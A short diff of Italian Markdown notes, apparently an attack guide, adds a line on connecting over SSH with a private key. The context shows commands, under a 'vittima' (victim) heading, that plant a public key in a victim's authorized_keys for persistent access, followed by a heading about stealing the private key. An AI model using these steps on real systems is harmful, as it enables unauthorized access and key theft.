@@ -13,7 +13,7 @@ vittima:
 mkdir -p /home/<USER>/.ssh
 echo $PUBLIC_KEY >> /home/<USER>/.ssh/authorized_keys
 ```
-
+connettersi con `ssh -i key <host>@<ip>`
 
 ## furto della PRIV_KEY
 
